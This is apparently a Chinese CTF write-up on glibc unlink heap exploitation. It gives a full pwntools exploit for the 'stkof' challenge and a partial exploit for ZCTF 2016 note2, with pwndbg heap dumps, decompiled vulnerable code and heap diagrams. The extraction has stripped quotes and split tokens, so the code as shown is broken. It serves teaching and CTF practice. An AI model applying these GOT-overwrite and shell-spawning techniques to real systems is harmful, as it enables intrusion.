rbp\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba 0x7ffff7a91130 \nmalloc\n        push   rbp \n0x7ffff7dd18e0\n\n...\uff0c\u7701\u7565\n \u25ba f 0     7ffff7a91130 malloc\n   f 1     7ffff7a7a1d5 _IO_file_doallocate+85\n   f 2     7ffff7a88594 _IO_doallocbuf+52\n   f 3     7ffff7a8769c _IO_file_underflow+508\n   f 4     7ffff7a8860e _IO_default_uflow+14\n   f 5     7ffff7a7bc6a _IO_getline_info+170\n   f 6     7ffff7a7bd78\n   f 7     7ffff7a7ab7d fgets+173\n   f 8           400d2e\n   f 9     7ffff7a2d830 __libc_start_main+240\n\n\n\n\n\u5206\u914d\u4e4b\u540e\uff0c\u5806\u5982\u4e0b\n\n\npwndbg\n heap\nTop Chunk: 0xe05410\nLast Remainder: 0\n\n0xe05000 PREV_INUSE {\n  prev_size = 0, \n  size = 1041, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0xe05410 PREV_INUSE {\n  prev_size = 0, \n  size = 134129, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n\n\n\n\n\u5f53\u5206\u914d16\u5927\u5c0f\u7684\u5185\u5b58\u540e\uff0c\u5806\u5e03\u5c40\u5982\u4e0b\n\n\npwndbg\n heap\nTop Chunk: 0xe05430\nLast Remainder: 0\n\n0xe05000 PREV_INUSE {\n  prev_size = 0, \n  size = 1041, \n  fd = 0xa3631, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0xe05410 FASTBIN {\n  prev_size = 0, \n  size = 33, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x20bd1\n}\n0xe05430 PREV_INUSE {\n  prev_size = 0, \n  size = 134097, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n\n\n\n\n\u5f53\u4f7f\u7528 printf \u51fd\u6570\uff0c\u4f1a\u5206\u914d 1024 \u5b57\u8282\u7a7a\u95f4\uff0c\u5982\u4e0b\n\n\n*RAX  0x0\n*RBX  0x400\n*RCX  0x7ffff7b03c34 (__fxstat64+20) \u25c2\u2014 cmp    rax, -0x1000 /* \nH=\n */\n*RDX  0x88\n*RDI  0x400\n*RSI  0x7fffffffd1c0 \u25c2\u2014 0x16\n R8   0x0\n*R9   0x0\n*R10  0x0\n*R11  0x246\n*R12  0x1\n*R13  0x7fffffffd827 \u25c2\u2014 0x31 /* \n1\n */\n R14  0x0\n*R15  0x400de4 \u25c2\u2014 and    eax, 0x2e000a64 /* \n%d\\n\n */\n*RBP  0x7ffff7dd2620 (_IO_2_1_stdout_) \u25c2\u2014 0xfbad2284\n*RSP  0x7fffffffd1b8 \u2014\u25b8 0x7ffff7a7a1d5 (_IO_file_doallocate+85) \u25c2\u2014 mov    rsi, rax\n*RIP  0x7ffff7a91130 (malloc) \u25c2\u2014 push   rbp\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba 0x7ffff7a91130 \nmalloc\n       push   rbp \n0x7ffff7dd2620\n\n\u3002\u3002\u3002\u7701\u7565\n\u25ba f 0     7ffff7a91130 malloc\n   f 1     7ffff7a7a1d5 _IO_file_doallocate+85\n   f 2     7ffff7a88594 _IO_doallocbuf+52\n   f 3     7ffff7a878f8 _IO_file_overflow+456\n   f 4     7ffff7a8628d _IO_file_xsputn+173\n   f 5     7ffff7a5ae00 vfprintf+3216\n   f 6     7ffff7a62899 printf+153\n   f 7           4009cd\n   f 8           400cb1\n   f 9     7ffff7a2d830 __libc_start_main+240\n\n\n\n\n\u5806\u5e03\u5c40\u5982\u4e0b\n\n\npwndbg\n heap\nTop Chunk: 0xe05840\nLast Remainder: 0\n\n0xe05000 PREV_INUSE {\n  prev_size = 0, \n  size = 1041, \n  fd = 0xa3631, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0xe05410 FASTBIN {\n  prev_size = 0, \n  size = 33, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x411\n}\n0xe05430 PREV_INUSE {\n  prev_size = 0, \n  size = 1041, \n  fd = 0xa4b4f, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0xe05840 PREV_INUSE {\n  prev_size = 0, \n  size = 133057, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n\n\n\n\n\u6b64\u540e\uff0c\u65e0\u8bba\u662f\u8f93\u5165\u8f93\u51fa\u90fd\u4e0d\u4f1a\u518d\u7533\u8bf7\u7f13\u51b2\u53bb\u4e86\u3002\u6240\u4ee5\u6211\u4eec\u6700\u597d\u6700\u521d\u7684\u7533\u8bf7\u4e00\u4e2a chunk \u6765\u628a\u8fd9\u4e9b\u7f13\u51b2\u533a\u7ed9\u7533\u8bf7\u4e86\uff0c\u65b9\u4fbf\u4e4b\u540e\u64cd\u4f5c\u3002\n\n\n\u4f46\u662f\uff0c\u6bd4\u8f83\u6709\u610f\u601d\u7684\u662f\uff0c\u5982\u679c\u6211\u4eec\u662f attach \u4e0a\u53bb\u7684\u8bdd\uff0c\u7b2c\u4e00\u4e2a\u7f13\u51b2\u533a\u5206\u914d\u7684\u5927\u5c0f\u4e3a 4096 \u5927\u5c0f\u3002\n\n\npwndbg\n heap\nTop Chunk: 0x1e9b010\nLast Remainder: 0\n\n0x1e9a000 PREV_INUSE {\n  prev_size = 0, \n  size = 4113, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n0x1e9b010 PREV_INUSE {\n  prev_size = 0, \n  size = 135153, \n  fd = 0x0, \n  bk = 0x0, \n  fd_nextsize = 0x0, \n  bk_nextsize = 0x0\n}\n\n\n\n\n\u57fa\u672c\u601d\u8def\n\n\n\u6839\u636e\u4e0a\u9762\u5206\u6790\uff0c\u6211\u4eec\u5728\u524d\u9762\u5148\u5206\u914d\u4e00\u4e2a chunk \u6765\u628a\u7f13\u51b2\u533a\u5206\u914d\u5b8c\u6bd5\uff0c\u4ee5\u514d\u5f71\u54cd\u4e4b\u540e\u7684\u64cd\u4f5c\u3002\n\n\n\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u6ca1\u6709 leak\uff0c\u8981\u60f3\u6267\u884c system \u7b49\u51fd\u6570\uff0c\u6211\u4eec\u7684\u9996\u8981\u76ee\u7684\u8fd8\u662f\u5148\u6784\u9020 leak\uff0c\u57fa\u672c\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u5229\u7528 unlink \u4fee\u6539 global[2] \u4e3a \nglobal[2]-0x18\u3002\n\n\n\u5229\u7528\u7f16\u8f91\u529f\u80fd\u4fee\u6539 global[0] \u4e3a free@got \u5730\u5740\uff0c\u540c\u65f6\u4fee\u6539 global[1] \u4e3aputs@got \u5730\u5740\uff0cglobal[2] \u4e3a atoi@got \u5730\u5740\u3002\n\n\n\u4fee\u6539 \nfree@got\n \u4e3a \nputs@plt\n \u7684\u5730\u5740\uff0c\u4ece\u800c\u5f53\u518d\u6b21\u8c03\u7528 \nfree\n \u51fd\u6570\u65f6\uff0c\u5373\u53ef\u76f4\u63a5\u8c03\u7528 puts \u51fd\u6570\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u6cc4\u6f0f\u51fd\u6570\u5185\u5bb9\u3002 \n\n\nfree global[2]\uff0c\u5373\u6cc4\u6f0f puts@got \u5185\u5bb9\uff0c\u4ece\u800c\u77e5\u9053 system \u51fd\u6570\u5730\u5740\u4ee5\u53ca libc \u4e2d /bin/sh \u5730\u5740\u3002\n\n\n\u4fee\u6539 \natoi@got\n \u4e3a system \u51fd\u6570\u5730\u5740\uff0c\u518d\u6b21\u8c03\u7528\u65f6\uff0c\u8f93\u5165 /bin/sh \u5730\u5740\u5373\u53ef\u3002\n\n\n\n\n\u4ee3\u7801\u5982\u4e0b\n\n\ncontext\n.\nterminal\n \n=\n \n[\ngnome-terminal\n,\n \n-x\n,\n \nsh\n,\n \n-c\n]\n\n\nif\n \nargs\n[\nDEBUG\n]:\n\n    \ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\ncontext\n.\nbinary\n \n=\n \n./stkof\n\n\nstkof\n \n=\n \nELF\n(\n./stkof\n)\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n7777\n)\n\n\nelse\n:\n\n    \np\n \n=\n \nprocess\n(\n./stkof\n)\n\n\nlog\n.\ninfo\n(\nPID: \n \n+\n \nstr\n(\nproc\n.\npidof\n(\np\n)[\n0\n]))\n\n\nlibc\n \n=\n \nELF\n(\n./libc.so.6\n)\n\n\nhead\n \n=\n \n0x602140\n\n\n\n\ndef\n \nalloc\n(\nsize\n):\n\n    \np\n.\nsendline\n(\n1\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nsize\n))\n\n    \np\n.\nrecvuntil\n(\nOK\n\\n\n)\n\n\n\n\ndef\n \nedit\n(\nidx\n,\n \nsize\n,\n \ncontent\n):\n\n    \np\n.\nsendline\n(\n2\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nidx\n))\n\n    \np\n.\nsendline\n(\nstr\n(\nsize\n))\n\n    \np\n.\nsend\n(\ncontent\n)\n\n    \np\n.\nrecvuntil\n(\nOK\n\\n\n)\n\n\n\n\ndef\n \nfree\n(\nidx\n):\n\n    \np\n.\nsendline\n(\n3\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nidx\n))\n\n\n\n\ndef\n \nexp\n():\n\n    \n# trigger to malloc buffer for io function\n\n    \nalloc\n(\n0x100\n)\n  \n# idx 1\n\n    \n# begin \n\n    \nalloc\n(\n0x30\n)\n  \n# idx 2\n\n    \n# small chunk size in order to trigger unlink\n\n    \nalloc\n(\n0x80\n)\n  \n# idx 3\n\n    \n# a fake chunk at global[2]=head+16 who\ns size is 0x20\n\n    \npayload\n \n=\n \np64\n(\n0\n)\n  \n#prev_size\n\n    \npayload\n \n+=\n \np64\n(\n0x20\n)\n  \n#size\n\n    \npayload\n \n+=\n \np64\n(\nhead\n \n+\n \n16\n \n-\n \n0x18\n)\n  \n#fd\n\n    \npayload\n \n+=\n \np64\n(\nhead\n \n+\n \n16\n \n-\n \n0x10\n)\n  \n#bk\n\n    \npayload\n \n+=\n \np64\n(\n0x20\n)\n  \n# next chunk\ns prev_size bypass the check\n\n    \npayload\n \n=\n \npayload\n.\nljust\n(\n0x30\n,\n \na\n)\n\n    \n# overwrite global[3]\ns chunk\ns prev_size\n\n    \n# make it believe that prev chunk is at global[2]\n\n    \npayload\n \n+=\n \np64\n(\n0x30\n)\n\n    \n# make it believe that prev chunk is free\n\n    \npayload\n \n+=\n \np64\n(\n0x90\n)\n\n    \nedit\n(\n2\n,\n \nlen\n(\npayload\n),\n \npayload\n)\n\n    \n# unlink fake chunk, so global[2] =\n(global[2])-0x18=head-8\n\n    \nfree\n(\n3\n)\n\n    \np\n.\nrecvuntil\n(\nOK\n\\n\n)\n\n    \n#gdb.attach(p)\n\n    \n# overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got\n\n    \npayload\n \n=\n \na\n \n*\n \n8\n \n+\n \np64\n(\nstkof\n.\ngot\n[\nfree\n])\n \n+\n \np64\n(\nstkof\n.\ngot\n[\nputs\n])\n \n+\n \np64\n(\n\n        \nstkof\n.\ngot\n[\natoi\n])\n\n    \nedit\n(\n2\n,\n \nlen\n(\npayload\n),\n \npayload\n)\n\n    \n# edit free@got to puts@plt\n\n    \npayload\n \n=\n \np64\n(\nstkof\n.\nplt\n[\nputs\n])\n\n    \nedit\n(\n0\n,\n \nlen\n(\npayload\n),\n \npayload\n)\n\n\n    \n#free global[1] to leak puts addr\n\n    \nfree\n(\n1\n)\n\n    \nputs_addr\n \n=\n \np\n.\nrecvuntil\n(\n\\n\nOK\n\\n\n,\n \ndrop\n=\nTrue\n)\n.\nljust\n(\n8\n,\n \n\\x00\n)\n\n    \nputs_addr\n \n=\n \nu64\n(\nputs_addr\n)\n\n    \nlog\n.\nsuccess\n(\nputs addr: \n \n+\n \nhex\n(\nputs_addr\n))\n\n    \nlibc_base\n \n=\n \nputs_addr\n \n-\n \nlibc\n.\nsymbols\n[\nputs\n]\n\n    \nbinsh_addr\n \n=\n \nlibc_base\n \n+\n \nnext\n(\nlibc\n.\nsearch\n(\n/bin/sh\n))\n\n    \nsystem_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\nsymbols\n[\nsystem\n]\n\n    \nlog\n.\nsuccess\n(\nlibc base: \n \n+\n \nhex\n(\nlibc_base\n))\n\n    \nlog\n.\nsuccess\n(\n/bin/sh addr: \n \n+\n \nhex\n(\nbinsh_addr\n))\n\n    \nlog\n.\nsuccess\n(\nsystem addr: \n \n+\n \nhex\n(\nsystem_addr\n))\n\n    \n# modify atoi@got to system addr\n\n    \npayload\n \n=\n \np64\n(\nsystem_addr\n)\n\n    \nedit\n(\n2\n,\n \nlen\n(\npayload\n),\n \npayload\n)\n\n    \np\n.\nsend\n(\np64\n(\nbinsh_addr\n))\n\n    \np\n.\ninteractive\n()\n\n\n\n\nif\n \n__name__\n \n==\n \n__main__\n:\n\n    \nexp\n()\n\n\n\n\n\n2016 ZCTF note2\n\n\n\u5206\u6790\u7a0b\u5e8f\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u5148\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u7684\u4e3b\u8981\u529f\u80fd\u4e3a\n\n\n\n\n\u6dfb\u52a0note\uff0csize\u9650\u5236\u4e3a0x80\uff0csize\u4f1a\u88ab\u8bb0\u5f55\uff0cnote\u6307\u9488\u4f1a\u88ab\u8bb0\u5f55\u3002\n\n\n\u5c55\u793anote\u5185\u5bb9\u3002\n\n\n\u7f16\u8f91note\u5185\u5bb9\uff0c\u5176\u4e2d\u5305\u62ec\u8986\u76d6\u5df2\u6709\u7684note\uff0c\u5728\u5df2\u6709\u7684note\u540e\u9762\u6dfb\u52a0\u5185\u5bb9\u3002\n\n\n\u91ca\u653enote\u3002\n\n\n\n\n\u4ed4\u7ec6\u5206\u6790\u540e\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u6709\u4ee5\u4e0b\u51e0\u4e2a\u95ee\u9898\n\n\n\n\n\u5728\u6dfb\u52a0note\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8bb0\u5f55note\u5bf9\u5e94\u7684\u5927\u5c0f\uff0c\u8be5\u5927\u5c0f\u4f1a\u7528\u4e8e\u63a7\u5236\u8bfb\u53d6note\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u8bfb\u53d6\u7684\u5faa\u73af\u53d8\u91cfi\u662f\u65e0\u7b26\u53f7\u53d8\u91cf\uff0c\u6240\u4ee5\u6bd4\u8f83\u65f6\u90fd\u4f1a\u8f6c\u6362\u4e3a\u65e0\u7b26\u53f7\u53d8\u91cf\uff0c\u90a3\u4e48\u5f53\u6211\u4eec\u8f93\u5165size\u4e3a0\u65f6\uff0cglibc\u6839\u636e\u5176\u89c4\u5b9a\uff0c\u4f1a\u5206\u914d0x20\u4e2a\u5b57\u8282\uff0c\u4f46\u662f\u7a0b\u5e8f\u8bfb\u53d6\u7684\u5185\u5bb9\u5374\u5e76\u4e0d\u53d7\u5230\u9650\u5236\uff0c\u6545\u800c\u4f1a\u4ea7\u751f\u5806\u6ea2\u51fa\u3002\n\n\n\u7a0b\u5e8f\u5728\u6bcf\u6b21\u7f16\u8f91note\u65f6\uff0c\u90fd\u4f1a\u7533\u8bf70xa0\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u4f46\u662f\u5728 free \u4e4b\u540e\u5e76\u6ca1\u6709\u8bbe\u7f6e\u4e3aNULL\u3002\n\n\n\n\n\u7b2c\u4e00\u4e2a\u95ee\u9898\u5bf9\u5e94\u5728ida\u4e2d\u7684\u4ee3\u7801\u5982\u4e0b\n\n\nunsigned\n \n__int64\n \n__fastcall\n \nReadLenChar\n(\n__int64\n \na1\n,\n \n__int64\n \na2\n,\n \nchar\n \na3\n)\n\n\n{\n\n  \nchar\n \nv4\n;\n \n// [sp+Ch] [bp-34h]@1\n\n  \nchar\n \nbuf\n;\n \n// [sp+2Fh] [bp-11h]@2\n\n  \nunsigned\n \n__int64\n \ni\n;\n \n// [sp+30h] [bp-10h]@1\n\n  \n__int64\n \nv7\n;\n \n// [sp+38h] [bp-8h]@2\n\n\n  \nv4\n \n=\n \na3\n;\n\n  \nfor\n \n(\n \ni\n \n=\n \n0LL\n;\n \na2\n \n-\n \n1\n \n \ni\n;\n \n++\ni\n \n)\n\n  \n{\n\n    \nv7\n \n=\n \nread\n(\n0\n,\n \nbuf\n,\n \n1uLL\n);\n\n    \nif\n \n(\n \nv7\n \n=\n \n0\n \n)\n\n      \nexit\n(\n-\n1\n);\n\n    \nif\n \n(\n \nbuf\n \n==\n \nv4\n \n)\n\n      \nbreak\n;\n\n    \n*\n(\n_BYTE\n \n*\n)(\ni\n \n+\n \na1\n)\n \n=\n \nbuf\n;\n\n  \n}\n\n  \n*\n(\n_BYTE\n \n*\n)(\na1\n \n+\n \ni\n)\n \n=\n \n0\n;\n\n  \nreturn\n \ni\n;\n\n\n}\n\n\n\n\n\n\u5176\u4e2di\u662funsigned\u7c7b\u578b\uff0ca2\u4e3aint\u7c7b\u578b\uff0c\u6240\u4ee5\u4e24\u8005\u5728for\u5faa\u73af\u76f8\u6bd4\u8f83\u7684\u65f6\u5019\uff0ca2-1\u7684\u7ed3\u679c-1\u4f1a\u88ab\u89c6\u4e3aunsigned\u7c7b\u578b\uff0c\u6b64\u65f6\uff0c\u5373\u6700\u5927\u7684\u6574\u6570\u3002\u6240\u4ee5\u8bf4\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u957f\u5ea6\u7684\u6570\u636e\uff0c\u8fd9\u91cc\u4e5f\u5c31\u662f\u540e\u9762\u6211\u4eec\u6ea2\u51fa\u6240\u4f7f\u7528\u7684\u529e\u6cd5\u3002\n\n\n\u57fa\u672c\u601d\u8def\n\n\n\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u5229\u7528\u53d1\u73b0\u7684\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u4e3b\u8981\u5229\u7528\u4e86 fastbin \u7684\u673a\u5236\u3001unlink \u7684\u673a\u5236\u3002\n\n\n\u4e0b\u9762\u4f9d\u6b21\u8fdb\u884c\u8bb2\u89e3\u3002\n\n\n\u57fa\u672c\u64cd\u4f5c\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u5148\u628anote\u53ef\u80fd\u7684\u57fa\u672c\u64cd\u4f5c\u5217\u4e3e\u51fa\u6765\u3002\n\n\np\n \n=\n \nprocess\n(\n./note2\n)\n\n\nnote2\n \n=\n \nELF\n(\n./note2\n)\n\n\nlibc\n \n=\n \nELF\n(\n/lib/x86_64-linux-gnu/libc.so.6\n)\n\n\ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\n\n\ndef\n \nnewnote\n(\nlength\n,\n \ncontent\n):\n\n    \np\n.\nrecvuntil\n(\noption---\n)\n\n    \np\n.\nsendline\n(\n1\n)\n\n    \np\n.\nrecvuntil\n(\n(less than 128)\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nlength\n))\n\n    \np\n.\nrecvuntil\n(\ncontent:\n)\n\n    \np\n.\nsendline\n(\ncontent\n)\n\n\n\n\ndef\n \nshownote\n(\nid\n):\n\n    \np\n.\nrecvuntil\n(\noption---\n)\n\n    \np\n.\nsendline\n(\n2\n)\n\n    \np\n.\nrecvuntil\n(\nnote:\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nid\n))\n\n\n\n\ndef\n \neditnote\n(\nid\n,\n \nchoice\n,\n \ns\n):\n\n    \np\n.\nrecvuntil\n(\noption---\n)\n\n    \np\n.\nsendline\n(\n3\n)\n\n    \np\n.\nrecvuntil\n(\nnote:\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nid\n))\n\n    \np\n.\nrecvuntil\n(\n2.append]\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nchoice\n))\n\n    \np\n.\nsendline\n(\ns\n)\n\n\n\n\ndef\n \ndeletenote\n(\nid\n):\n\n    \np\n.\nrecvuntil\n(\noption---\n)\n\n    \np\n.\nsendline\n(\n4\n)\n\n    \np\n.\nrecvuntil\n(\nnote:\n)\n\n    \np\n.\nsendline\n(\nstr\n(\nid\n))\n\n\n\n\n\n\u751f\u6210\u4e09\u4e2anote\n\n\n\u8fd9\u4e00\u90e8\u5206\u5bf9\u5e94\u7684\u4ee3\u7801\u5982\u4e0b\n\n\n# chunk0: a fake chunk\n\n\nptr\n \n=\n \n0x0000000000602120\n\n\nfakefd\n \n=\n \nptr\n \n-\n \n0x18\n\n\nfakebk\n \n=\n \nptr\n \n-\n \n0x10\n\n\ncontent\n \n=\n \na\n \n*\n \n8\n \n+\n \np64\n(\n0x61\n)\n \n+\n \np64\n(\nfakefd\n)\n \n+\n \np64\n(\nfakebk\n)\n \n+\n \nb\n \n*\n \n64\n \n+\n \np64\n(\n0x60\n)\n\n\n#content = p64(fakefd) + p64(fakebk)\n\n\nnewnote\n(\n128\n,\n \ncontent\n)\n\n\n# chunk1: a zero size chunk produce overwrite\n\n\nnewnote\n(\n0\n,\n \na\n \n*\n \n8\n)\n\n\n# chunk2: a chunk to be overwrited and freed\n\n\nnewnote\n(\n0x80\n,\n \nb\n \n*\n \n16\n)\n\n\n\n\n\n\u5176\u4e2d\u8fd9\u4e09\u4e2anote\u7684\u5927\u5c0f\u5206\u522b\u4e3a0x80\uff0c0\uff0c0x80\uff0c\u7b2c\u4e8c\u4e2achunk\u867d\u7136\u7533\u8bf7\u7684\u5927\u5c0f\u4e3a0\uff0c\u4f46\u662fglibc\u7684\u8981\u6c42chunk\u5757\u81f3\u5c11\u53ef\u4ee5\u5b58\u50a84\u4e2a\u5fc5\u8981\u7684\u5b57\u6bb5(prev_size,size,fd,bk)\uff0c\u6240\u4ee5\u4f1a\u5206\u914d0x20\u7684\u7a7a\u95f4\u3002\u540c\u65f6\uff0c\u7531\u4e8e\u65e0\u7b26\u53f7\u6574\u6570\u7684\u6bd4\u8f83\u95ee\u9898\uff0c\u53ef\u4ee5\u4e3a\u8be5note\u8f93\u5165\u4efb\u610f\u957f\u7684\u5b57\u7b26\u4e32\u3002\n\n\n\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cchunk1\u4e2d\u4e00\u5171\u6784\u9020\u4e86\u4e24\u4e2achunk\n\n\n\n\nchunk ptr[0]\uff0c\u8fd9\u4e2a\u662f\u4e3a\u4e86unlink\u65f6\u4fee\u6539\u5bf9\u5e94\u7684\u503c\u3002\n\n\nchunk ptr[0]'s nextchunk\uff0c\u8fd9\u4e2a\u662f\u4e3a\u4e86\u4f7f\u5f97unlink\u65f6\u7684\u7b2c\u4e00\u4e2a\u68c0\u67e5\u6ee1\u8db3\u3002\n\n\n\n\n    \n// \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002\n\n    \nif\n \n(\n__builtin_expect\n \n(\nchunksize\n(\nP\n)\n \n!=\n \nprev_size\n \n(\nnext_chunk\n(\nP\n)),\n \n0\n))\n      \\\n      \nmalloc_printerr\n \n(\ncorrupted size vs. prev_size\n);\n               \\\n\n\n\n\n\u5f53\u6784\u9020\u5b8c\u4e09\u4e2a note \u540e\uff0c\u5806\u7684\u57fa\u672c\u6784\u9020\u5982\u56fe1\u6240\u793a\u3002\n\n\n                                   +-----------------+ high addr\n                                   |      ...        |\n                                   +-----------------+\n                                   |      \nb\n*8      |\n                ptr[2]-----------\n +-----------------+\n                                   |    size=0x91    |\n                                   +-----------------+\n                                   |    prevsize     |\n                                   +-----------------+------------\n                                   |    unused       |\n                                   +-----------------+\n                                   |    \na\n*8        |\n                 ptr[1]----------\n +-----------------+  chunk 1\n                                   |    size=0x20    |\n                                   +-----------------+\n                                   |    prevsize     |\n                                   +-----------------+-------------\n                                   |    unused       |\n                                   +-----------------+\n                                   |  prev_size=0x60 |\nfake ptr[0] chunk\ns nextchunk-----\n+-----------------+\n                                   |    64*\na\n       |\n                                   +-----------------+\n                                   |    fakebk       |\n                                   +-----------------+\n                                   |    fakefd       |\n                                   +-----------------+\n                                   |    0x61         |  chunk 0\n                                   +-----------------+\n                                   |    \na *8        |\n                 ptr[0]----------\n +-----------------+\n                                   |    size=0x91    |\n                                   +-----------------+\n                                   |    prev_size    |\n                                   +-----------------+  low addr\n                                           \u56fe1\n\n\n\n\n\u91ca\u653echunk1-\u8986\u76d6chunk2-\u91ca\u653echunk2\n\n\n\u5bf9\u5e94\u7684\u4ee3\u7801\u5982\u4e0b\n\n\n# edit the chunk1 to overwrite the chunk2\n\n\ndeletenote\n(\n1\n)\n\n\ncontent\n \n=\n \na\n \n*\n \n16\n \n+\n \np64\n(\n0xa0\n)\n \n+\n \np64\n(\n0x90\n)\n\n\nnewnote\n(\n0\n,\n \ncontent\n)\n\n\n# delete note 2 to trigger the unlink\n\n\n# after unlink, ptr[0] = ptr - 0x18\n\n\ndeletenote\n(\n2\n)\n\n\n\n\n\n\u9996\u5148\u91ca\u653e chunk1\uff0c\u7531\u4e8e\u8be5chunk\u5c5e\u4e8efastbin\uff0c\u6240\u4ee5\u4e0b\u6b21\u5728\u7533\u8bf7\u7684\u65f6\u5019\u4ecd\u7136\u4f1a\u7533\u8bf7\u5230\u8be5chunk\uff0c\u540c\u65f6\u7531\u4e8e\u4e0a\u9762\u6240\u8bf4\u7684\u7c7b\u578b\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u5b57\u7b26\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u8986\u76d6chunk3\uff0c\u8986\u76d6\u4e4b\u540e\u5982\u56fe2\u6240\u793a\u3002\n\n\n                                   +-----------------+high addr\n                                   |      ...        |\n                                   +-----------------+\n                                   |   \n\\x00\n+\nb\n*7  |\n                ptr[2]-----------\n +-----------------+ chunk 2\n                                   |    size=0x90    |\n                                   +-----------------+\n                                   |    0xa0         |\n                                   +-----------------+------------\n                                   |    \na\n*8        |\n                                   +-----------------+\n                                   |    \na\n*8        |\n                 ptr[1]----------\n +-----------------+ chunk 1\n                                   |    size=0x20    |\n                                   +-----------------+\n                                   |    prevsize     |\n                                   +-----------------+-------------\n                                   |    unused       |\n                                   +-----------------+\n                                   |  prev_size=0x60 |\nfake ptr[0] chunk\ns nextchunk-----\n+-----------------+\n                                   |    64*\na\n       |\n                                   +-----------------+\n                                   |    fakebk       |\n                                   +-----------------+\n                                   |    fakefd       |\n                                   +-----------------+\n                                   |    0x61         |  chunk 0\n                                   +-----------------+\n                                   |    \na *8        |\n                 ptr[0]----------\n +-----------------+\n                                   |    size=0x91    |\n                                   +-----------------+\n                                   |    prev_size    |\n                                   +-----------------+  low addr\n                                           